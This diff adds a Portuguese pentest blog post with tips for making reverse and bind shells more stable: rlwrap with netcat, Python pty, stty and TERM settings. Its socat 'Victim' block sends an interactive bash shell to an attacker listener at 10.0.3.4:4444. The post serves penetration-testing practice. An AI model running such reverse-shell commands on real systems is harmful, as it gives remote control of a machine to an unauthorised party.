@@ -1,0 +1,99 @@
+---
+title: Melhorias em SHELL
+description: Dicas para melhorar a experiência em reverse/bind shells.
+slug: shell_improvements
+authors: raphaelsander
+tags: [pentest, shell, reverse_shell, bind_shell]
+hide_table_of_contents: false
+---
+
+Pequenas melhorias na shell são importantes em pentests porque tornam bind e reverse
+shells mais estáveis, interativas e fáceis de usar, especialmente quando se precisa
+executar comandos complexos ou transferir arquivos.
+
+{/* truncate */}
+
+## `rlwrap` para Reverse Shells
+
+O `rlwrap` é uma ferramenta que adiciona recursos de edição de linha e histórico
+a programas que não os possuem, como `nc`. Ele é especialmente útil para reverse
+shells, pois permite que você use as setas do teclado para navegar pelo histórico
+de comandos e edite comandos anteriores, tornando a experiência mais fluida.
+
+```bash
+rlwrap -cAr nc -lvnp 4444
+```
+
+:::info
+**Opções do `rlwrap`**:
+- `-c`: Completa nome de arquivos e diretórios.
+- `-A`: ANSII colour, útil para destacar comandos e saídas.
+- `-r`: Aprende palavras que aparecem tanto na entrada quanto na saída do programa
+  encapsulado e as adicione automaticamente à lista de autocompletar.
+
+**Opções do `nc`**:
+- `-l`: Modo listen, aguarda conexões de entrada.
+- `-v`: Modo verboso, exibe informações adicionais.
+- `-n`: Desativa a resolução de nomes DNS.
+- `-p`: Especifica o número da porta para escutar.
+:::
+
+## Pseudo Terminal com Python
+
+Às vezes, quando você obtém uma reverse ou bind shell, ela pode ser limitada em
+termos de interatividade. Para melhorar isso, você pode usar o seguinte comando
+para spawnar uma shell mais interativa:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# ou
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+## Utilizando `socat` para Reverse e Bind Shells
+
+```bash
+# Listener
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+```
+
+```bash
+# Victim
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
+```
+
+## `TERM` - Variável de Ambiente
+
+A variável de ambiente `TERM` é usada para informar ao sistema o tipo de terminal
+que está sendo usado. Definir `TERM` para `xterm` ou `xterm-256color` pode melhorar
+a compatibilidade e a funcionalidade da shell, especialmente quando se trata de
+recursos como cores, formatação e controle de cursor, mas principalmente permite
+o uso do comando `clear` para limpar a tela, o que é muito útil durante um pentest.
+
+```bash
+export TERM=xterm
+```
+
+## Melhorando a Experiência com `stty`
+
+O comando `stty` é usado para configurar as opções do terminal. Configurar `stty`
+para `raw` e `echo` para `0` pode melhorar a experiência em reverse e bind shells
+ao permitir que a shell seja mais responsiva e interativa, especialmente quando
+se trata de comandos que exigem entrada do usuário ou quando se deseja evitar que
+os comandos digitados sejam exibidos na tela.
+
+```bash
+# Na bind/reverse shell
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl-Z
+
+# No Kali/máquina atacante
+$ stty raw -echo
+$ fg
+
+# Na bind/reverse shell
+$ reset
+$ export SHELL=bash
+$ export TERM=xterm-256color
+$ stty rows <num> columns <cols>
+```
